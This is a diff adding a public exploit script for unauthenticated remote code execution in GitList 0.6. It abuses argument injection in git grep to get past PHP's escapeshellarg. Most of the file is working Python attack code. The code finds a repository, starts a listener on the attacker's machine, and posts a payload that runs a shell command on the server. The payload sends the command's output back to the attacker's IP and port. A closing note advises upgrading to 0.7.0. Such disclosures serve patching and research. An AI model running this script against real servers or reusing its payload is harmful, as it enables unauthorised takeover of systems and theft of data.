@@ -1,0 +1,100 @@
+'''
+# Exploit Title: GitList 0.6 Unauthenticated RCE
+# Date: 25-04-2018
+# Software Link: https://github.com/klaussilveira/gitlist
+# Exploit Author: Kacper Szurek
+# Contact: https://twitter.com/KacperSzurek
+# Website: https://security.szurek.pl/
+# Category: remote
+  
+1. Description
+ 
+Bypass/Exploit `escapeshellarg` using argument injection: `git grep --open-files-in-pager=whoami`.
+
+More info about this technique:
+
+https://security.szurek.pl/exploit-bypass-php-escapeshellarg-escapeshellcmd.html
+ 
+2. Proof of Concept
+'''
+
+import requests
+from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
+import urlparse
+import urllib
+import threading
+import time
+import os
+import re
+
+url = 'http://192.168.1.1/gitlist/'
+command = 'id'
+your_ip = '192.168.1.100'
+your_port = 8001
+
+print "GitList 0.6 Unauthenticated RCE"
+print "by Kacper Szurek"
+print "https://security.szurek.pl/"
+
+print "REMEMBER TO DISABLE FIREWALL"
+
+search_url = None
+r = requests.get(url)
+repos = re.findall(r'/([^/]+)/master/rss', r.text)
+
+if len(repos) == 0:
+	print "[-] No repos"
+	os._exit(0)
+
+for repo in repos:
+	print "[+] Found repo {}".format(repo)
+	r = requests.get("{}{}".format(url, repo))
+	files = re.findall(r'href="[^\"]+blob/master/([^\"]+)"', r.text)
+	for file in files:
+		r = requests.get("{}{}/raw/master/{}".format(url, repo, file))
+		print "[+] Found file {}".format(file)
+		print r.text[0:100]
+		search_url = "{}{}/tree/{}/search".format(url, repo, r.text[0:1])		
+		break
+
+if not search_url:
+	print "[-] No files in repo"
+	os._exit(0)
+
+print "[+] Search using {}".format(search_url)
+
+class GetHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        parsed_path = urlparse.urlparse(self.path)
+        print "[+] Command response"
+        print urllib.unquote_plus(parsed_path.query).decode('utf8')[2:]
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write("OK")
+        os._exit(0)
+
+    def log_message(self, format, *args):
+        return
+
+def exploit_server():
+	server = HTTPServer((your_ip, your_port), GetHandler)
+	server.serve_forever()
+
+print "[+] Start server on {}:{}".format(your_ip, your_port)
+t = threading.Thread(target=exploit_server)
+t.daemon = True
+t.start()
+print "[+] Server started"
+
+r  = requests.post(search_url, data={'query':'--open-files-in-pager=php -r "file_get_contents(\\"http://{}:{}/?a=\\".urlencode(shell_exec(\\"{}\\")));"'.format(your_ip, your_port, command)})
+
+while True:
+    time.sleep(1)
+
+'''
+3. Solution:
+
+Update to version 0.7.0
+
+https://github.com/klaussilveira/gitlist/releases/tag/0.7.0
+'''
